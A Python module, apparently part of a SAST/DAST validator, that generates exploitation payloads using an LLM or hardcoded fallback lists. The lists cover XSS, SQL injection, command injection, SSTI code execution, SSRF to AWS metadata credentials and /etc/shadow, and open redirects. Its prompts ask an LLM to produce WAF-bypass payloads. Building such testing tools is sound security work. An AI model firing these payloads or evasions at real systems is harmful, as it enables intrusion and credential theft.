"""
Dynamic Payload Generator

Uses LLM to generate context-aware exploitation payloads based on:
1. Vulnerability type and context from static analysis
2. Technology stack information (database, framework, OS)
3. Previous test results and WAF behavior
4. Iterative refinement based on responses

This replaces hardcoded payload lists with intelligent, adaptive payload generation.
"""

import logging
import json
import re
from typing import Any
from dataclasses import dataclass, field

from sast_dast_validator.models import (
    NormalizedFinding,
    VulnType,
    VulnCategory,
)

logger = logging.getLogger(__name__)


# ============================================================================
# Payload Context
# ============================================================================

@dataclass
class PayloadContext:
    """
    Context for payload generation.
    
    Contains all information the LLM needs to generate targeted payloads:
    - Vulnerability details from static analysis
    - Technology stack (database, framework, template engine, OS)
    - Code snippets showing the vulnerable sink
    - Previous test results for iterative refinement
    """
    
    # Vulnerability info
    vuln_type: VulnType
    category: VulnCategory
    url: str
    param_name: str | None = None
    param_location: str = "query"
    method: str = "GET"
    
    # Technology stack (from static analysis or runtime detection)
    database: str | None = None  # mysql, postgresql, sqlite, mssql, oracle
    database_version: str | None = None
    framework: str | None = None  # express, django, flask, spring, rails, laravel
    template_engine: str | None = None  # jinja2, twig, freemarker, erb, velocity, thymeleaf
    os: str | None = None  # linux, windows
    language: str | None = None  # python, javascript, php, java, ruby, go
    
    # Code context from static analysis
    source_code: str | None = None  # Vulnerable code snippet
    sink_function: str | None = None  # e.g., db.query, os.system, Template()
    data_flow: str | None = None  # How input reaches sink
    sanitization_attempts: list[str] = field(default_factory=list)  # Any filtering detected
    
    # Previous test results for refinement
    previous_payloads: list[dict] = field(default_factory=list)
    waf_detected: bool = False
    waf_behavior: str | None = None
    blocked_patterns: list[str] = field(default_factory=list)
    
    # Initial witness from static analysis
    witness_payload: str | None = None
    
    def to_prompt_context(self) -> str:
        """Convert context to prompt-friendly format for LLM."""
        parts = []
        
        parts.append(f"**Vulnerability Type:** {self.vuln_type.value}")
        parts.append(f"**Target URL:** {self.url}")
        
        if self.param_name:
            parts.append(f"**Parameter:** {self.param_name} (location: {self.param_location}, method: {self.method})")
        
        # Technology stack
        tech_parts = []
        if self.database:
            db_info = self.database
            if self.database_version:
                db_info += f" v{self.database_version}"
            tech_parts.append(f"Database: {db_info}")
        if self.framework:
            tech_parts.append(f"Framework: {self.framework}")
        if self.template_engine:
            tech_parts.append(f"Template Engine: {self.template_engine}")
        if self.os:
            tech_parts.append(f"OS: {self.os}")
        if self.language:
            tech_parts.append(f"Language: {self.language}")
        
        if tech_parts:
            parts.append(f"\n**Technology Stack:**\n" + "\n".join(f"  - {t}" for t in tech_parts))
        
        if self.source_code:
            parts.append(f"\n**Vulnerable Code:**\n```\n{self.source_code}\n```")
        
        if self.sink_function:
            parts.append(f"**Sink Function:** `{self.sink_function}`")
        
        if self.data_flow:
            parts.append(f"**Data Flow:** {self.data_flow}")
        
        if self.sanitization_attempts:
            parts.append(f"\n**Detected Sanitization:**\n" + "\n".join(f"  - {s}" for s in self.sanitization_attempts))
        
        if self.witness_payload:
            parts.append(f"\n**Initial Witness Payload:** `{self.witness_payload}`")
        
        if self.previous_payloads:
            parts.append("\n**Previous Test Results:**")
            for i, p in enumerate(self.previous_payloads[-5:], 1):
                status = "✅ Success" if p.get("success") else "❌ Failed"
                response_preview = p.get('response', '')[:100]
                parts.append(f"  {i}. `{p['payload']}` → {status}")
                if response_preview:
                    parts.append(f"      Response: {response_preview}")
        
        if self.waf_detected:
            parts.append(f"\n**⚠️ WAF Detected:** {self.waf_behavior or 'Unknown behavior'}")
            if self.blocked_patterns:
                parts.append(f"  Blocked patterns: {', '.join(self.blocked_patterns)}")
        
        return "\n".join(parts)
    
    def add_test_result(self, payload: str, success: bool, response: str):
        """Add a test result for refinement."""
        self.previous_payloads.append({
            "payload": payload,
            "success": success,
            "response": response[:500]
        })
        
        # Detect WAF behavior
        response_lower = response.lower()
        waf_indicators = ["blocked", "forbidden", "waf", "firewall", "access denied", "403", "406"]
        if any(ind in response_lower for ind in waf_indicators):
            self.waf_detected = True
            self.waf_behavior = f"Blocked payload: {payload}"
            self.blocked_patterns.append(payload)


@dataclass
class GeneratedPayload:
    """A generated payload with metadata."""
    payload: str
    marker: str | None = None  # What to look for in response
    technique: str | None = None  # e.g., "error-based", "union", "time-based"
    description: str | None = None  # Human-readable description
    encoding: str | None = None  # Any encoding applied
    priority: int = 1  # Lower = try first
    bypass_target: str | None = None  # What this payload bypasses


# ============================================================================
# Payload Generation Prompts
# ============================================================================

PAYLOAD_GENERATION_SYSTEM = """You are an expert penetration tester specializing in web application security.
Your task is to generate exploitation payloads that are:
1. Targeted to the specific technology stack
2. Designed to evade common defenses
3. Optimized for detection (clear markers)
4. Progressive (from simple to complex)

Always consider:
- Database-specific syntax (MySQL vs PostgreSQL vs MSSQL)
- Template engine-specific payloads (Jinja2 vs Twig vs Freemarker)
- OS-specific commands (Linux vs Windows)
- WAF bypass techniques when blocked
- Encoding requirements"""


PAYLOAD_GENERATION_PROMPT = """Generate {num_payloads} exploitation payloads for this vulnerability:

{context}

Requirements:
1. Each payload should be different (vary techniques)
2. Include detection markers where possible
3. Consider any WAF/filtering based on previous results
4. Progress from simple to more complex
5. Use technology-specific syntax

Return a JSON array with this exact format:
```json
[
  {{
    "payload": "the actual payload string",
    "marker": "what to look for in response (or null)",
    "technique": "technique name (e.g., error-based, union, time-based)",
    "description": "brief description of what this payload does",
    "priority": 1
  }}
]
```

Generate exactly {num_payloads} payloads, ordered by priority (1 = try first)."""


REFINEMENT_PROMPT = """The previous payloads were blocked or failed. Generate {num_payloads} NEW bypass payloads.

{context}

The following patterns were blocked:
{blocked_patterns}

Generate bypass payloads using:
1. Alternative encoding (URL, HTML, Unicode, double-encoding)
2. Case variations and obfuscation
3. Alternative syntax for the same operation
4. Payload fragmentation/concatenation
5. Comment injection to break patterns

Return JSON array with the same format as before."""


# ============================================================================
# Technology Detection
# ============================================================================

def detect_technology_from_finding(finding: NormalizedFinding) -> dict:
    """Detect technology stack from finding metadata and message."""
    tech = {}
    
    message = (finding.message or "").lower()
    metadata = finding.metadata or {}
    
    # Database detection
    db_patterns = {
        "mysql": ["mysql", "mysqli", "mariadb"],
        "postgresql": ["postgres", "postgresql", "pg_", "psycopg"],
        "sqlite": ["sqlite", "sqlite3"],
        "mssql": ["mssql", "sql server", "sqlsrv", "pyodbc"],
        "oracle": ["oracle", "cx_oracle", "oracledb"],
        "mongodb": ["mongodb", "mongoose", "pymongo"],
    }
    
    for db, patterns in db_patterns.items():
        if any(p in message for p in patterns):
            tech["database"] = db
            break
    
    if "database" in metadata:
        tech["database"] = metadata["database"]
    
    # Template engine detection
    template_patterns = {
        "jinja2": ["jinja", "jinja2", "flask"],
        "twig": ["twig", "symfony"],
        "freemarker": ["freemarker"],
        "velocity": ["velocity"],
        "thymeleaf": ["thymeleaf"],
        "erb": ["erb", "rails", "ruby"],
        "ejs": ["ejs"],
        "pug": ["pug", "jade"],
        "handlebars": ["handlebars", "hbs"],
        "mustache": ["mustache"],
    }
    
    for engine, patterns in template_patterns.items():
        if any(p in message for p in patterns):
            tech["template_engine"] = engine
            break
    
    # Framework detection
    framework_patterns = {
        "express": ["express", "node.js", "nodejs"],
        "django": ["django"],
        "flask": ["flask"],
        "fastapi": ["fastapi"],
        "spring": ["spring", "springboot"],
        "rails": ["rails", "ruby on rails"],
        "laravel": ["laravel"],
        "symfony": ["symfony"],
        "asp.net": ["asp.net", "aspnet", ".net"],
    }
    
    for framework, patterns in framework_patterns.items():
        if any(p in message for p in patterns):
            tech["framework"] = framework
            break
    
    # Language detection from file extension
    if finding.file_path:
        ext = finding.file_path.split(".")[-1].lower()
        lang_map = {
            "py": "python",
            "js": "javascript",
            "ts": "typescript",
            "php": "php",
            "java": "java",
            "rb": "ruby",
            "go": "go",
            "cs": "csharp",
            "rs": "rust",
        }
        if ext in lang_map:
            tech["language"] = lang_map[ext]
    
    # OS detection
    os_patterns = {
        "linux": ["linux", "/bin/", "/etc/", "bash", "sh "],
        "windows": ["windows", "cmd.exe", "powershell", "c:\\"],
    }
    
    for os_name, patterns in os_patterns.items():
        if any(p in message for p in patterns):
            tech["os"] = os_name
            break
    
    return tech


# ============================================================================
# Fallback Payload Definitions (when LLM unavailable)
# ============================================================================

FALLBACK_PAYLOADS = {
    # XSS Payloads - comprehensive list
    VulnType.XSS: [
        # Basic
        GeneratedPayload(payload="<script>alert('XSS')</script>", marker="XSS", technique="basic-script", priority=1),
        GeneratedPayload(payload="<img src=x onerror=alert('XSS')>", marker="XSS", technique="img-onerror", priority=2),
        GeneratedPayload(payload="<svg onload=alert('XSS')>", marker="XSS", technique="svg-onload", priority=3),
        # Context breakout
        GeneratedPayload(payload="'\"><script>alert('XSS')</script>", marker="XSS", technique="quote-breakout", priority=4),
        GeneratedPayload(payload="</script><script>alert('XSS')</script>", marker="XSS", technique="script-breakout", priority=5),
        # Encoding bypass
        GeneratedPayload(payload="<img src=x onerror=alert&#40;'XSS'&#41;>", marker="XSS", technique="html-entity", priority=6),
        GeneratedPayload(payload="<svg/onload=alert('XSS')>", marker="XSS", technique="no-space", priority=7),
        # Event handlers
        GeneratedPayload(payload="<body onload=alert('XSS')>", marker="XSS", technique="body-onload", priority=8),
        GeneratedPayload(payload="<input onfocus=alert('XSS') autofocus>", marker="XSS", technique="autofocus", priority=9),
        # Polyglot
        GeneratedPayload(payload="jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//", marker="alert", technique="polyglot", priority=10),
    ],
    
    # SQL Injection - database specific
    VulnType.SQLI: [
        # Universal
        GeneratedPayload(payload="' OR '1'='1' --", technique="auth-bypass", priority=1),
        GeneratedPayload(payload="' OR '1'='1", technique="no-comment", priority=2),
        GeneratedPayload(payload="1' OR '1'='1' --", technique="numeric-context", priority=3),
        # Error-based
        GeneratedPayload(payload="' AND 1=CONVERT(int,@@version)--", marker="error", technique="mssql-error", priority=4),
        GeneratedPayload(payload="' AND extractvalue(1,concat(0x7e,version()))--", marker="error", technique="mysql-error", priority=5),
        # Boolean-based
        GeneratedPayload(payload="' AND '1'='1", technique="boolean-true", priority=6),
        GeneratedPayload(payload="' AND '1'='2", technique="boolean-false", priority=7),
        # Time-based
        GeneratedPayload(payload="' AND SLEEP(3)-- ", marker="delay", technique="mysql-time", priority=8),
        GeneratedPayload(payload="'; SELECT pg_sleep(3)--", marker="delay", technique="postgres-time", priority=9),
        GeneratedPayload(payload="'; WAITFOR DELAY '0:0:3'--", marker="delay", technique="mssql-time", priority=10),
        # UNION-based
        GeneratedPayload(payload="' UNION SELECT NULL--", technique="union-probe", priority=11),
        GeneratedPayload(payload="' UNION SELECT NULL,NULL--", technique="union-2col", priority=12),
        GeneratedPayload(payload="' UNION SELECT NULL,NULL,NULL--", technique="union-3col", priority=13),
    ],
    
    # Command Injection - OS specific
    VulnType.CMDI: [
        # Linux
        GeneratedPayload(payload="; id", marker="uid=", technique="semicolon-linux", priority=1),
        GeneratedPayload(payload="| whoami", technique="pipe", priority=2),
        GeneratedPayload(payload="$(whoami)", technique="subshell", priority=3),
        GeneratedPayload(payload="`id`", marker="uid=", technique="backtick", priority=4),
        GeneratedPayload(payload="|| id", marker="uid=", technique="or-linux", priority=5),
        GeneratedPayload(payload="; cat /etc/passwd", marker="root:", technique="file-read", priority=6),
        # Windows
        GeneratedPayload(payload="& whoami", technique="ampersand-win", priority=7),
        GeneratedPayload(payload="| dir", technique="pipe-win", priority=8),
        GeneratedPayload(payload="&& whoami", technique="and-win", priority=9),
        # Bypass
        GeneratedPayload(payload=";i]d", marker="uid=", technique="bracket-bypass", priority=10),
        GeneratedPayload(payload="${IFS}id", marker="uid=", technique="ifs-bypass", priority=11),
    ],
    
    # SSTI - template engine specific
    VulnType.SSTI: [
        # Universal probes
        GeneratedPayload(payload="{{7*7}}", marker="49", technique="jinja2-probe", priority=1),
        GeneratedPayload(payload="${7*7}", marker="49", technique="freemarker-probe", priority=2),
        GeneratedPayload(payload="<%= 7*7 %>", marker="49", technique="erb-probe", priority=3),
        GeneratedPayload(payload="#{7*7}", marker="49", technique="ruby-probe", priority=4),
        # Jinja2/Python
        GeneratedPayload(payload="{{config}}", technique="jinja2-config", priority=5),
        GeneratedPayload(payload="{{''.__class__.__mro__[1].__subclasses__()}}", technique="jinja2-classes", priority=6),
        GeneratedPayload(payload="{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}", marker="root:", technique="jinja2-file", priority=7),
        # Twig/PHP
        GeneratedPayload(payload="{{_self.env.display('id')}}", marker="uid=", technique="twig-rce", priority=8),
        # Freemarker
        GeneratedPayload(payload="<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}", marker="uid=", technique="freemarker-rce", priority=9),
    ],
    
    # SSRF
    VulnType.SSRF: [
        GeneratedPayload(payload="http://127.0.0.1:22", marker="SSH", technique="localhost-port", priority=1),
        GeneratedPayload(payload="http://127.0.0.1:80", technique="localhost-http", priority=2),
        GeneratedPayload(payload="http://169.254.169.254/latest/meta-data/", marker="ami-id", technique="aws-metadata", priority=3),
        GeneratedPayload(payload="http://169.254.169.254/latest/meta-data/iam/security-credentials/", technique="aws-creds", priority=4),
        GeneratedPayload(payload="file:///etc/passwd", marker="root:", technique="file-read", priority=5),
        GeneratedPayload(payload="file:///etc/shadow", technique="shadow-read", priority=6),
        GeneratedPayload(payload="http://[::1]:80/", technique="ipv6-localhost", priority=7),
        GeneratedPayload(payload="http://0.0.0.0:80/", technique="zero-ip", priority=8),
        # Bypass
        GeneratedPayload(payload="http://127.1/", technique="short-localhost", priority=9),
        GeneratedPayload(payload="http://0x7f.0x0.0x0.0x1/", technique="hex-ip", priority=10),
    ],
    
    # Open Redirect
    VulnType.OPEN_REDIRECT: [
        GeneratedPayload(payload="https://evil.example.com", technique="direct", priority=1),
        GeneratedPayload(payload="//evil.example.com", technique="protocol-relative", priority=2),
        GeneratedPayload(payload="https://evil.example.com%2f%2e%2e", technique="encoded-path", priority=3),
        GeneratedPayload(payload="https://trusted.com@evil.example.com", technique="at-bypass", priority=4),
        GeneratedPayload(payload="////evil.example.com", technique="multi-slash", priority=5),
        GeneratedPayload(payload="https:evil.example.com", technique="missing-slash", priority=6),
        GeneratedPayload(payload="\\\\evil.example.com", technique="backslash", priority=7),
        GeneratedPayload(payload="https://evil。example。com", technique="unicode-dot", priority=8),
    ],
}

# Add aliases
FALLBACK_PAYLOADS[VulnType.XSS_REFLECTED] = FALLBACK_PAYLOADS[VulnType.XSS]
FALLBACK_PAYLOADS[VulnType.XSS_STORED] = FALLBACK_PAYLOADS[VulnType.XSS]
FALLBACK_PAYLOADS[VulnType.XSS_DOM] = FALLBACK_PAYLOADS[VulnType.XSS]
FALLBACK_PAYLOADS[VulnType.INJECTION] = FALLBACK_PAYLOADS[VulnType.SQLI]


# ============================================================================
# Database-Specific Payload Generators
# ============================================================================

def get_database_specific_payloads(database: str) -> list[GeneratedPayload]:
    """Get payloads specific to a database type."""
    payloads = []
    
    if database == "mysql":
        payloads = [
            GeneratedPayload(payload="' OR '1'='1' #", technique="mysql-comment", priority=1),
            GeneratedPayload(payload="' AND SLEEP(3)#", marker="delay", technique="mysql-time", priority=2),
            GeneratedPayload(payload="' UNION SELECT @@version,NULL,NULL#", marker="version", technique="mysql-version", priority=3),
            GeneratedPayload(payload="' AND extractvalue(1,concat(0x7e,(SELECT version())))#", marker="error", technique="mysql-error", priority=4),
            GeneratedPayload(payload="' UNION SELECT table_name,NULL,NULL FROM information_schema.tables#", technique="mysql-tables", priority=5),
        ]
    elif database == "postgresql":
        payloads = [
            GeneratedPayload(payload="'; SELECT pg_sleep(3)--", marker="delay", technique="postgres-time", priority=1),
            GeneratedPayload(payload="' UNION SELECT version(),NULL,NULL--", marker="PostgreSQL", technique="postgres-version", priority=2),
            GeneratedPayload(payload="' UNION SELECT current_user,NULL,NULL--", technique="postgres-user", priority=3),
            GeneratedPayload(payload="'; COPY (SELECT '') TO PROGRAM 'id'--", marker="uid=", technique="postgres-rce", priority=4),
        ]
    elif database == "mssql":
        payloads = [
            GeneratedPayload(payload="'; WAITFOR DELAY '0:0:3'--", marker="delay", technique="mssql-time", priority=1),
            GeneratedPayload(payload="' UNION SELECT @@version,NULL,NULL--", marker="Microsoft", technique="mssql-version", priority=2),
            GeneratedPayload(payload="'; EXEC xp_cmdshell 'whoami'--", marker="uid", technique="mssql-rce", priority=3),
            GeneratedPayload(payload="' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))--", marker="error", technique="mssql-error", priority=4),
        ]
    elif database == "sqlite":
        payloads = [
            GeneratedPayload(payload="' UNION SELECT sqlite_version(),NULL,NULL--", marker="3.", technique="sqlite-version", priority=1),
            GeneratedPayload(payload="' UNION SELECT name,NULL,NULL FROM sqlite_master--", technique="sqlite-tables", priority=2),
        ]
    elif database == "oracle":
        payloads = [
            GeneratedPayload(payload="' UNION SELECT banner,NULL,NULL FROM v$version--", marker="Oracle", technique="oracle-version", priority=1),
            GeneratedPayload(payload="' AND 1=utl_inaddr.get_host_address('test')--", marker="error", technique="oracle-error", priority=2),
        ]
    
    return payloads


def get_template_specific_payloads(engine: str) -> list[GeneratedPayload]:
    """Get payloads specific to a template engine."""
    payloads = []
    
    if engine == "jinja2":
        payloads = [
            GeneratedPayload(payload="{{7*7}}", marker="49", technique="jinja2-math", priority=1),
            GeneratedPayload(payload="{{config}}", technique="jinja2-config", priority=2),
            GeneratedPayload(payload="{{config.items()}}", technique="jinja2-config-items", priority=3),
            GeneratedPayload(payload="{{self.__init__.__globals__.__builtins__}}", technique="jinja2-builtins", priority=4),
            GeneratedPayload(payload="{{''.__class__.__mro__[1].__subclasses__()}}", technique="jinja2-subclasses", priority=5),
            GeneratedPayload(payload="{{''.__class__.__mro__[1].__subclasses__()[370]('id',shell=True,stdout=-1).communicate()[0]}}", marker="uid=", technique="jinja2-rce", priority=6),
        ]
    elif engine == "twig":
        payloads = [
            GeneratedPayload(payload="{{7*7}}", marker="49", technique="twig-math", priority=1),
            GeneratedPayload(payload="{{_self}}", technique="twig-self", priority=2),
            GeneratedPayload(payload="{{_self.env.display('whoami')}}", technique="twig-display", priority=3),
            GeneratedPayload(payload="{{['id']|filter('system')}}", marker="uid=", technique="twig-filter", priority=4),
        ]
    elif engine == "freemarker":
        payloads = [
            GeneratedPayload(payload="${7*7}", marker="49", technique="freemarker-math", priority=1),
            GeneratedPayload(payload="<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}", marker="uid=", technique="freemarker-exec", priority=2),
        ]
    elif engine == "velocity":
        payloads = [
            GeneratedPayload(payload="#set($x=7*7)$x", marker="49", technique="velocity-math", priority=1),
            GeneratedPayload(payload="#set($rt=$class.forName('java.lang.Runtime').getRuntime())#set($proc=$rt.exec('id'))", technique="velocity-exec", priority=2),
        ]
    elif engine == "erb":
        payloads = [
            GeneratedPayload(payload="<%= 7*7 %>", marker="49", technique="erb-math", priority=1),
            GeneratedPayload(payload="<%= system('id') %>", marker="uid=", technique="erb-system", priority=2),
            GeneratedPayload(payload="<%= `id` %>", marker="uid=", technique="erb-backtick", priority=3),
        ]
    
    return payloads


# ============================================================================
# Dynamic Payload Generator
# ============================================================================

class PayloadGenerator:
    """
    Generates exploitation payloads dynamically using LLM.
    
    The generator uses multiple sources of context:
    1. Static analysis findings (vuln type, code snippets)
    2. Technology detection (database, framework, template engine)
    3. Previous test results (for iterative refinement)
    4. WAF behavior (for bypass generation)
    
    When LLM is unavailable, falls back to comprehensive static payloads
    that are still technology-aware.
    """
    
    def __init__(self, llm: Any = None):
        """
        Initialize the payload generator.
        
        Args:
            llm: LLM instance for dynamic generation (optional)
        """
        self.llm = llm
        self._cache: dict[str, list[GeneratedPayload]] = {}
    
    async def generate_payloads(
        self,
        finding: NormalizedFinding,
        context: PayloadContext | None = None,
        num_payloads: int = 5,
        use_cache: bool = True,
    ) -> list[GeneratedPayload]:
        """
        Generate payloads for a vulnerability.
        
        Args:
            finding: The normalized finding to generate payloads for
            context: Optional pre-built context
            num_payloads: Number of payloads to generate
            use_cache: Whether to use cached payloads
            
        Returns:
            List of GeneratedPayload objects
        """
        # Build context if not provided
        if context is None:
            context = self._build_context(finding)
        
        # Check cache
        cache_key = self._get_cache_key(finding, context)
        if use_cache and cache_key in self._cache:
            logger.debug(f"Using cached payloads for {cache_key}")
            return self._cache[cache_key]
        
        # Generate via LLM if available
        if self.llm is not None:
            try:
                payloads = await self._generate_via_llm(finding, context, num_payloads)
                if payloads:
                    if use_cache:
                        self._cache[cache_key] = payloads
                    return payloads
            except Exception as e:
                logger.warning(f"LLM payload generation failed: {e}, using fallback")
        
        # Fallback to static payloads
        payloads = self._get_fallback_payloads(finding, context)
        
        if use_cache and payloads:
            self._cache[cache_key] = payloads
        
        return payloads
    
    async def generate_bypass_payloads(
        self,
        finding: NormalizedFinding,
        context: PayloadContext,
        blocked_payloads: list[str],
        num_payloads: int = 5,
    ) -> list[GeneratedPayload]:
        """
        Generate bypass payloads after initial payloads were blocked.
        
        Args:
            finding: The normalized finding
            context: Current payload context with test history
            blocked_payloads: List of payloads that were blocked
            num_payloads: Number of bypass payloads to generate
            
        Returns:
            List of bypass payloads
        """
        context.waf_detected = True
        context.blocked_patterns.extend(blocked_payloads)
        
        if self.llm is not None:
            try:
                return await self._generate_bypass_via_llm(finding, context, blocked_payloads, num_payloads)
            except Exception as e:
                logger.warning(f"LLM bypass generation failed: {e}, using fallback")
        
        return self._get_bypass_fallback(finding, context, blocked_payloads)
    
    async def refine_payloads(
        self,
        finding: NormalizedFinding,
        context: PayloadContext,
        test_result: dict,
    ) -> list[GeneratedPayload]:
        """
        Generate refined payloads based on a test result.
        
        Args:
            finding: The normalized finding
            context: Current payload context
            test_result: Dict with keys: payload, success, response
            
        Returns:
            List of refined payloads
        """
        # Add result to context
        context.add_test_result(
            payload=test_result.get("payload", ""),
            success=test_result.get("success", False),
            response=test_result.get("response", "")
        )
        
        # If WAF detected, generate bypass payloads
        if context.waf_detected:
            return await self.generate_bypass_payloads(
                finding, context, context.blocked_patterns
            )
        
        # Otherwise generate new payloads with updated context
        return await self.generate_payloads(finding, context, use_cache=False)
    
    def _build_context(self, finding: NormalizedFinding) -> PayloadContext:
        """Build payload context from a finding."""
        # Detect technology stack
        tech = detect_technology_from_finding(finding)
        
        context = PayloadContext(
            vuln_type=finding.vuln_type,
            category=finding.get_category(),
            url=finding.url,
            param_name=finding.param_name,
            param_location=finding.param_location,
            method=finding.method,
            witness_payload=finding.witness_payload or finding.payload_hint,
            database=tech.get("database"),
            framework=tech.get("framework"),
            template_engine=tech.get("template_engine"),
            os=tech.get("os"),
            language=tech.get("language"),
        )
        
        # Add metadata if available
        metadata = finding.metadata or {}
        if "source_code" in metadata:
            context.source_code = metadata["source_code"]
        if "sink_function" in metadata:
            context.sink_function = metadata["sink_function"]
        if "data_flow" in metadata:
            context.data_flow = metadata["data_flow"]
        
        return context
    
    def _get_cache_key(self, finding: NormalizedFinding, context: PayloadContext) -> str:
        """Generate cache key for payload caching."""
        parts = [
            finding.vuln_type.value,
            context.database or "",
            context.template_engine or "",
            context.os or "",
        ]
        return ":".join(parts)
    
    async def _generate_via_llm(
        self,
        finding: NormalizedFinding,
        context: PayloadContext,
        num_payloads: int,
    ) -> list[GeneratedPayload]:
        """Generate payloads using LLM."""
        prompt = PAYLOAD_GENERATION_PROMPT.format(
            context=context.to_prompt_context(),
            num_payloads=num_payloads
        )
        
        # Combine system and user prompt into single string for browser-use LLM
        full_prompt = f"{PAYLOAD_GENERATION_SYSTEM}\n\n{prompt}"
        
        try:
            response = await self.llm.ainvoke(full_prompt)
            response_text = response.content if hasattr(response, 'content') else str(response)
            
            payloads = self._parse_payload_response(response_text)
            logger.info(f"LLM generated {len(payloads)} payloads for {finding.vuln_type.value}")
            return payloads
            
        except Exception as e:
            logger.error(f"LLM payload generation error: {e}")
            raise
    
    async def _generate_bypass_via_llm(
        self,
        finding: NormalizedFinding,
        context: PayloadContext,
        blocked_payloads: list[str],
        num_payloads: int,
    ) -> list[GeneratedPayload]:
        """Generate bypass payloads using LLM."""
        blocked_list = "\n".join(f"- `{p}`" for p in blocked_payloads[-5:])
        
        prompt = REFINEMENT_PROMPT.format(
            context=context.to_prompt_context(),
            blocked_patterns=blocked_list,
            num_payloads=num_payloads
        )
        
        # Combine system and user prompt into single string for browser-use LLM
        full_prompt = f"{PAYLOAD_GENERATION_SYSTEM}\n\n{prompt}"
        
        try:
            response = await self.llm.ainvoke(full_prompt)
            response_text = response.content if hasattr(response, 'content') else str(response)
            
            payloads = self._parse_payload_response(response_text)
            for p in payloads:
                p.bypass_target = "WAF"
            
            logger.info(f"LLM generated {len(payloads)} bypass payloads")
            return payloads
            
        except Exception as e:
            logger.error(f"LLM bypass generation error: {e}")
            raise
    
    def _parse_payload_response(self, response: str) -> list[GeneratedPayload]:
        """Parse LLM response into GeneratedPayload objects."""
        payloads = []
        
        try:
            # Find JSON array in response
            json_match = re.search(r'\[[\s\S]*?\]', response)
            if json_match:
                data = json.loads(json_match.group())
                for item in data:
                    if isinstance(item, dict) and "payload" in item:
                        payloads.append(GeneratedPayload(
                            payload=item.get("payload", ""),
                            marker=item.get("marker"),
                            technique=item.get("technique"),
                            description=item.get("description"),
                            priority=item.get("priority", 1),
                            encoding=item.get("encoding"),
                        ))
        except json.JSONDecodeError as e:
            logger.warning(f"Failed to parse JSON from LLM response: {e}")
            # Try to extract payloads from backticks
            matches = re.findall(r'`([^`]+)`', response)
            for i, match in enumerate(matches):
                if len(match) > 2 and not match.startswith("json"):
                    payloads.append(GeneratedPayload(
                        payload=match,
                        priority=i + 1
                    ))
        
        return payloads
    
    def _get_fallback_payloads(
        self,
        finding: NormalizedFinding,
        context: PayloadContext,
    ) -> list[GeneratedPayload]:
        """Get fallback payloads when LLM is unavailable."""
        payloads = []
        vuln_type = finding.vuln_type
        
        # Get base payloads for vulnerability type
        if vuln_type in FALLBACK_PAYLOADS:
            payloads.extend(FALLBACK_PAYLOADS[vuln_type])
        
        # Add technology-specific payloads
        if context.database and vuln_type in (VulnType.SQLI, VulnType.INJECTION):
            db_payloads = get_database_specific_payloads(context.database)
            # Insert at beginning with high priority
            for i, p in enumerate(db_payloads):
                p.priority = i + 1
            payloads = db_payloads + payloads
        
        if context.template_engine and vuln_type == VulnType.SSTI:
            template_payloads = get_template_specific_payloads(context.template_engine)
            for i, p in enumerate(template_payloads):
                p.priority = i + 1
            payloads = template_payloads + payloads
        
        # Add witness payload if available
        if context.witness_payload:
            witness = GeneratedPayload(
                payload=context.witness_payload,
                technique="witness",
                description="Initial witness from static analysis",
                priority=0  # Highest priority
            )
            payloads.insert(0, witness)
        
        # Sort by priority and deduplicate
        seen = set()
        unique_payloads = []
        for p in sorted(payloads, key=lambda x: x.priority):
            if p.payload not in seen:
                seen.add(p.payload)
                unique_payloads.append(p)
        
        return unique_payloads[:15]  # Limit to 15 payloads
    
    def _get_bypass_fallback(
        self,
        finding: NormalizedFinding,
        context: PayloadContext,
        blocked_payloads: list[str],
    ) -> list[GeneratedPayload]:
        """Generate bypass payloads without LLM."""
        payloads = []
        vuln_type = finding.vuln_type
        
        # XSS bypass techniques
        if vuln_type in (VulnType.XSS, VulnType.XSS_REFLECTED, VulnType.XSS_STORED, VulnType.XSS_DOM):
            payloads = [
                GeneratedPayload(payload="<ScRiPt>alert('XSS')</ScRiPt>", technique="case-mix", bypass_target="case-filter", priority=1),
                GeneratedPayload(payload="<scr<script>ipt>alert('XSS')</scr</script>ipt>", technique="nested-tags", bypass_target="tag-filter", priority=2),
                GeneratedPayload(payload="<img src=x onerror=&#97;&#108;&#101;&#114;&#116;('XSS')>", technique="html-entity", bypass_target="keyword-filter", priority=3),
                GeneratedPayload(payload="<svg/onload=alert`XSS`>", technique="template-literal", bypass_target="paren-filter", priority=4),
                GeneratedPayload(payload="<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>", technique="base64", bypass_target="keyword-filter", priority=5),
            ]
        
        # SQLi bypass techniques
        elif vuln_type in (VulnType.SQLI, VulnType.INJECTION):
            payloads = [
                GeneratedPayload(payload="'/**/OR/**/1=1--", technique="comment-space", bypass_target="space-filter", priority=1),
                GeneratedPayload(payload="'%0AOR%0A1=1--", technique="newline", bypass_target="space-filter", priority=2),
                GeneratedPayload(payload="' oR '1'='1", technique="case-mix", bypass_target="keyword-filter", priority=3),
                GeneratedPayload(payload="'+OR+'1'='1", technique="plus-space", bypass_target="space-filter", priority=4),
                GeneratedPayload(payload="'||1=1--", technique="double-pipe", bypass_target="or-filter", priority=5),
            ]
        
        # Command injection bypass
        elif vuln_type == VulnType.CMDI:
            payloads = [
                GeneratedPayload(payload=";${IFS}id", technique="ifs-bypass", bypass_target="space-filter", priority=1),
                GeneratedPayload(payload=";{id,}", technique="brace-expansion", bypass_target="space-filter", priority=2),
                GeneratedPayload(payload="$((1))i]d", technique="bracket-bypass", bypass_target="command-filter", priority=3),
                GeneratedPayload(payload=";'i'd", technique="quote-bypass", bypass_target="command-filter", priority=4),
            ]
        
        return payloads


# ============================================================================
# Payload Tester with Iterative Refinement
# ============================================================================

class PayloadTester:
    """
    Tests payloads with iterative refinement.
    
    Works with PayloadGenerator to:
    1. Generate initial payloads
    2. Test each payload
    3. Refine based on results
    4. Generate bypass payloads if blocked
    """
    
    def __init__(self, generator: PayloadGenerator):
        """
        Initialize the tester.
        
        Args:
            generator: PayloadGenerator instance
        """
        self.generator = generator
        self.results: list[dict] = []
    
    async def test_with_refinement(
        self,
        finding: NormalizedFinding,
        test_func,  # async (url, payload) -> (success, response)
        max_attempts: int = 3,
        max_payloads_per_attempt: int = 5,
    ) -> dict:
        """
        Test payloads with iterative refinement.
        
        Args:
